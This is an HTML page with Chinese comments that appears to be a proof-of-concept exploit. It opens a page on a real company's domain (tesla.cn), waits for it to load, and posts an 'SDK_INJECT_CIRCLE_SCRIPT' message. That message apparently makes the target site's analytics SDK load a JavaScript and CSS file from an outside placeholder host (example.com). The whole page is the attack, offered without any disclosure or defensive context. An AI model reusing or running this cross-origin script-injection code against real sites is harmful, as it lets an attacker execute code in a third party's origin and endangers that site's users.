<!DOCTYPE html>
<html>
<head>
    <title>A网站（跨域版）</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>A网站（带旧B窗口加载确认）</h1>
    <button id="triggerBtn">打开B网站并触发输出</button>
    <div id="log"></div>
<script>
        const B_ORIGIN = 'https://www.tesla.cn'; // 替换为实际B网站域名
        let bWindow = null;
        const logEl = document.getElementById('log');
 
        // 日志打印
        const log = (msg) => {
            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            console.log(msg);
        };
 
        // 核心：等待旧B窗口完全加载完成的工具函数
        const waitForBWindowLoad = (bWindow, timeout = 10000) => {
            return new Promise((resolve, reject) => {
                const timeoutId = setTimeout(() => {
                    reject(new Error('等待B窗口加载超时'));
                }, timeout);
 
                // 监听B窗口发送的加载完成事件
                const messageHandler = (event) => {
                    if (event.origin === B_ORIGIN && event.data.type === 'b_window_loaded') {
                        window.removeEventListener('message', messageHandler);
                        clearTimeout(timeoutId);
                        resolve();
                    }
                };
                window.addEventListener('message', messageHandler);
 
                // 轮询检测窗口状态，防止消息丢失
                const checkInterval = setInterval(() => {
                    if (bWindow.closed) {
                        clearInterval(checkInterval);
                        reject(new Error('B窗口被用户关闭'));
                    }
                    try {
                        // 尝试访问B窗口的document，加载完成后才不会跨域报错
                        if (bWindow.document) {
                            // 主动ping B窗口，触发加载完成确认
                            bWindow.postMessage({ type: 'ping' }, B_ORIGIN);
                        }
                    } catch (e) {
                        // 跨域报错属于正常现象，说明还在加载中
                    }
                }, 200);
            });
        };
 
        // A窗口定义vds属性
        window.vds = 1;
 
        document.getElementById('triggerBtn').addEventListener('click', async () => {
            try {
                log('开始打开旧B窗口...');
                bWindow = window.open(`${B_ORIGIN}/b.html`, '_blank');
 
                log('等待旧B窗口完全加载...');
                // 等待B窗口加载完成，超时时间10秒
                await waitForBWindowLoad(bWindow);
                log('✅ 旧B窗口加载完成，准备发送消息');
 
                // 发送业务消息
                 bWindow.postMessage({
                        type: "SDK_INJECT_CIRCLE_SCRIPT",
                        cssURL:"https://www.example.com/1.css",
                        jsURL:"https://www.example.com/1.js"
                    }, B_ORIGIN); // 这里必须是B的完整域名，不能用'*'
                log('已向B网站发送触发消息');
 
                // 发送完成后立即跳转新B窗口
                setTimeout(() => {
                    log('正在跳转到新B窗口...');
                    window.location.href = `${B_ORIGIN}/b.html?isNew=true`;
                }, 0);
 
            } catch (error) {
                log(`❌ 流程失败: ${error.message}`);
            }
        });
    </script>
</body>
</html>
